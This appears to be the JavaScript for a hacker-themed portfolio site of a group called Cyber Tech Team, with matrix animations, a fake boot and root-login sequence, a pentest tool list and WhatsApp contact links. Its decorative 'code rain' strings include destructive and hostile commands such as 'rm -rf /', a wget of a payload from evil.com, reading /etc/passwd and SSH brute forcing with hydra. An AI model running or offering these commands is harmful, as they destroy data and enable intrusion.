// MATRIX BACKGROUND
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = 'CYBER TECH TEAM010101010HACK█▓▒░';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function matrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#00ff41';
    ctx.font = fontSize + 'px Share Tech Mono';
    for(let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(matrix, 33);

// CODE RAIN - HACKING CODE YAPITA
const codeCanvas = document.getElementById('code-rain');
const codeCtx = codeCanvas.getContext('2d');
codeCanvas.width = window.innerWidth;
codeCanvas.height = window.innerHeight;
const codeLines = [
    'function hack() { return access_granted; }',
    'if (firewall.bypassed) { exploit(); }',
    'const target = "192.168.1.1";',
    'ssh root@target -p 22',
    'SELECT * FROM users WHERE admin=1;',
    'nmap -sS -sV -A target.com',
    'hydra -l admin -P rockyou.txt ssh://target',
    'msfconsole -q -x "use exploit/multi/handler"',
    'while(true) { exploit(); }',
    'sudo rm -rf / --no-preserve-root',
    'import os; os.system("rm -rf /")',
    'cat /etc/passwd | grep root',
    'chmod 777 backdoor.sh',
    './exploit.py --target 192.168.1.1',
    'ping -c 1 google.com',
    'wget http://evil.com/payload.sh',
    'curl -X POST http://target/login',
    '0x48 0x65 0x6C 0x6C 0x6F',
    'ACCESS_GRANTED',
    'ROOTKIT_INSTALLED'
];
const codeDrops = [];

for(let i = 0; i < 15; i++) {
    codeDrops.push({
        x: Math.random() * codeCanvas.width,
        y: Math.random() * codeCanvas.height,
        text: codeLines[Math.floor(Math.random() * codeLines.length)],
        speed: Math.random() * 2 + 0.5
    });
}

function codeRain() {
    codeCtx.fillStyle = 'rgba(0, 0, 0, 0.1)';
    codeCtx.fillRect(0, 0, codeCanvas.width, codeCanvas.height);
    codeCtx.fillStyle = '#00ff41';
    codeCtx.font = '12px Share Tech Mono';
    codeCtx.shadowBlur = 5;
    codeCtx.shadowColor = '#00ff41';
    
    codeDrops.forEach(drop => {
        codeCtx.fillText(drop.text, drop.x, drop.y);
        drop.y += drop.speed;
        if(drop.y > codeCanvas.height) {
            drop.y = -20;
            drop.x = Math.random() * codeCanvas.width;
            drop.text = codeLines[Math.floor(Math.random() * codeLines.length)];
        }
    });
}
setInterval(codeRain, 50);

// SOUND
const keySound = document.getElementById('key');
const beepSound = document.getElementById('beep');
function playKey() { if(keySound) { keySound.currentTime = 0; keySound.play().catch(e=>{}); } }
function playBeep() { if(beepSound) { beepSound.currentTime = 0; beepSound.play().catch(e=>{}); } }

// PROJECTS DATA - ONGEZA PROJECTS HAPA
const PROJECTS_DATA = [
    { name: "HACK TOOL v1.0", desc: "Automated Nmap Scanner + Report Generator", status: "done" },
    { name: "WEBSITE VULNERABILITY SCANNER", desc: "SQLi, XSS, CSRF Detection", status: "pending" },
    { name: "DARKNET CRAWLER", desc: "Tor Network Indexer", status: "failed" }
];

// BOOT - HAKUNA AUTO SCROLL
const bootLog = document.getElementById('boot-log');
const bootLines = [
    '[0.000000] Linux version 6.6.6-cybertech (root@cybertech) (gcc version 13.2.0)',
    '[0.001234] Command line: BOOT_IMAGE=/boot/vmlinuz root=/dev/sda1 rw quiet splash',
    '[0.002456] Kernel command line: quiet splash initrd=initramfs.img',
    '[ OK ] Started Network Manager',
    '[ OK ] Reached target Network',
    '[ OK ] Started Firewall Daemon [iptables]',
    '[ OK ] Activated VPN [Tanzania - DAR_ES_SALAAM]',
    '[ OK ] Started TOR Service on port 9050',
    '[ OK ] Mounted /dev/hack_tools',
    '[ OK ] Mounted /dev/premium_apps',
    '[ OK ] Mounted /dev/classified',
    '[ OK ] Started SSH Server on port 22 [ENCRYPTED]',
    '[ OK ] Loaded CYBER TECH TEAM kernel modules',
    '[ OK ] Reached target Graphical Interface',
    '[ OK ] Started Cyber Division Service',
    '[ OK ] Encryption: AES-256-GCM [ACTIVE]',
    '[ WARNING ] Trace protection: ENABLED',
    '',
    'CYBER TECH TEAM DARKNET OS v4.0 [UNAUTHORIZED ACCESS DETECTED]',
    'System ready. Root access granted.',
    ''
];

let bootIndex = 0;
function boot() {
    if(bootIndex < bootLines.length) {
        bootLog.textContent += bootLines[bootIndex] + '\n';
        bootIndex++;
        playKey();
        setTimeout(boot, Math.random() * 120 + 40);
    } else {
        const bootDiv = document.getElementById('boot-complete');
        bootDiv.classList.remove('hidden');
        bootDiv.innerHTML = '<button class="btn" id="continue-btn">[ INITIATE MAINFRAME ACCESS ]</button>';
        setTimeout(() => continueToLogin(), 3000);
        document.getElementById('continue-btn').addEventListener('click', continueToLogin);
        document.addEventListener('keydown', (e) => { if(e.key === 'Enter') continueToLogin(); });
    }
}

function continueToLogin() {
    playBeep();
    document.getElementById('boot').classList.add('hidden');
    document.getElementById('login').classList.remove('hidden');
    login();
}

// LOGIN
function login() {
    const user = document.getElementById('user');
    const pass = document.getElementById('pass');
    const passRow = document.getElementById('pass-row');
    let i = 0;
    const username = 'root';
    const password = '********';

    function typeUser() {
        if(i < username.length) {
            user.textContent += username[i++];
            playKey();
            setTimeout(typeUser, 100);
        } else {
            setTimeout(() => {
                passRow.classList.remove('hidden');
                i = 0;
                typePass();
            }, 300);
        }
    }

    function typePass() {
        if(i < password.length) {
            pass.textContent += password[i++];
            playKey();
            setTimeout(typePass, 80);
        } else {
            setTimeout(() => {
                document.getElementById('granted').classList.remove('hidden');
                playBeep();
                setTimeout(() => {
                    document.getElementById('loading').classList.remove('hidden');
                    let dots = 0;
                    const dotInterval = setInterval(() => {
                        document.getElementById('dots').textContent = '.'.repeat(dots % 4);
                        dots++;
                    }, 300);
                    setTimeout(() => {
                        clearInterval(dotInterval);
                        document.getElementById('login').classList.add('hidden');
                        document.getElementById('main').classList.remove('hidden');
                        initMain();
                    }, 2000);
                }, 500);
            }, 300);
        }
    }
    typeUser();
}

// MAIN
function initMain() {
    let seconds = 0;
    setInterval(() => {
        seconds++;
        const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
        const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
        const s = String(seconds % 60).padStart(2, '0');
        document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
        document.getElementById('cpu').textContent = Math.floor(Math.random() * 30 + 10) + '%';
    }, 1000);

    const cmd = document.getElementById('cmd');
    const commands = [
        'nmap -sS -sV -O 192.168.1.0/24',
        'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target',
        'sqlmap -u "http://target.com/page?id=1" --dbs --batch',
        'msfconsole -q -x "use exploit/multi/handler"',
        'aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap',
        'john --wordlist=rockyou.txt hashes.txt',
        'hashcat -m 0 -a 0 hash.txt rockyou.txt'
    ];
    let cmdIndex = 0, charIndex = 0;
    function typeCmd() {
        if(charIndex < commands[cmdIndex].length) {
            cmd.textContent += commands[cmdIndex][charIndex++];
            playKey();
            setTimeout(typeCmd, 40);
        } else {
            setTimeout(() => {
                cmd.textContent = '';
                charIndex = 0;
                cmdIndex = (cmdIndex + 1) % commands.length;
                typeCmd();
            }, 2000);
        }
    }
    typeCmd();

    document.querySelectorAll('.menu-item').forEach(item => {
        item.addEventListener('click', function() {
            playBeep();
            openModule(this.getAttribute('data-module'));
        });
    });

    document.querySelector('.close').addEventListener('click', () => {
        document.getElementById('module-content').classList.add('hidden');
    });
}

// MODULES
function openModule(name) {
    const content = document.getElementById('module-content');
    const title = document.getElementById('module-title');
    const body = document.getElementById('module-body');

    if(name === 'services') {
        playBeep();
        window.location.href = 'service.html';
        return;
    }

    if(name === 'apps') {
        playBeep();
        window.location.href = 'premium-apps.html';
        return;
    }

    if(name === 'projects') {
        title.textContent = 'PROJECTS.log [CLASSIFIED]';
        let html = '<h3 class="cyan">> ACTIVE MISSIONS LOG</h3>';
        html += '<p class="red">> CLEARANCE LEVEL 5 REQUIRED</p>';
        PROJECTS_DATA.forEach(proj => {
            const statusColor = proj.status === 'done'? 'green' : proj.status === 'pending'? 'yellow' : 'red';
            html += `<div class="app-card"><h3>[<span class="${statusColor}">${proj.status.toUpperCase()}</span>] ${proj.name}</h3><p>${proj.desc}</p></div>`;
        });
        body.innerHTML = html;
    }

    if(name === 'tools') {
        title.textContent = 'HACK_TOOLS.sh [WEAPONIZED]';
        body.innerHTML = `
            <h3 class="cyan">> ETHICAL HACKING ARSENAL</h3>
            <p class="red">> WARNING: FOR EDUCATIONAL & AUTHORIZED TESTING ONLY!</p>
            <p class="yellow">> Unauthorized use is illegal and punishable by law.</p>
            <div class="app-card"><h3>[01] Nmap</h3><p>Network Scanner & Port Mapper | Version 7.95</p><p>> Command: nmap -sS -sV target</p></div>
            <div class="app-card"><h3>[02] Metasploit Framework</h3><p>Penetration Testing Framework | Version 6.4</p><p>> Command: msfconsole</p></div>
            <div class="app-card"><h3>[03] Wireshark</h3><p>Network Protocol Analyzer | Version 4.2</p><p>> Command: wireshark</p></div>
            <div class="app-card"><h3>[04] Burp Suite</h3><p>Web Vulnerability Scanner | Professional</p><p>> Command: burpsuite</p></div>
            <div class="app-card"><h3>[05] SQLMap</h3><p>Automatic SQL Injection Tool</p><p>> Command: sqlmap -u "url" --dbs</p></div>
            <div class="app-card"><h3>[06] John The Ripper</h3><p>Password Cracker | Version 1.9</p><p>> Command: john hashes.txt</p></div>
        `;
    }

    if(name === 'contact') {
        title.textContent = 'CONTACT.sh [SECURE]';
        body.innerHTML = `
            <h3 class="cyan">> CYBER TECH TEAM</h3>
            <p class="red">> ENCRYPTED COMMUNICATIONS ONLY</p>
            <div class="team-member"><h3>[01] CYBER TECHNOLOGY</h3><p>> Role: <span class="red">CEO & FOUNDER</span></p><p>> Skills: Network Security, Pentesting, Digital Forensics</p></div>
            <div class="team-member"><h3>[02] T20_SMILER</h3><p>> Role: <span class="red">LEAD DEVELOPER</span></p><p>> Skills: Web Dev, App Dev, Database, API</p></div>
            <div class="team-member"><h3>[03] TEKNOVA</h3><p>> Role: <span class="red">OWNER</span></p><p>> Skills: Business, Infrastructure, Cloud</p></div>
            <div class="team-member"><h3>[04] JACKAL ALSANTI</h3><p>> Role: <span class="red">DEVELOPER</span></p><p>> Skills: UI/UX, Frontend, Graphics, Design</p></div>
            <h3 class="cyan" style="margin-top:30px">> WHATSAPP SUPPORT [E2E ENCRYPTED]</h3>
            <button class="btn" onclick="window.open('https://wa.me/255611378027?text=Niaje%20mkuu%20CYBER%20TECH%20TEAM,%20nina%20msahada','_blank')">[ SUPPORT #1 ]</button>
            <button class="btn" onclick="window.open('https://wa.me/255799629385?text=Niaje%20mkuu%20CYBER%20TECH%20TEAM,%20nina%20msahada','_blank')">[ SUPPORT #2 ]</button>
            <button class="btn" onclick="window.open('https://wa.me/255627417402?text=Niaje%20mkuu%20CYBER%20TECH%20TEAM,%20nina%20msahada','_blank')">[ SUPPORT #3 ]</button>
        `;
    }

    content.classList.remove('hidden');
}

window.onload = () => setTimeout(boot, 500);
window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    codeCanvas.width = window.innerWidth;
    codeCanvas.height = window.innerHeight;
});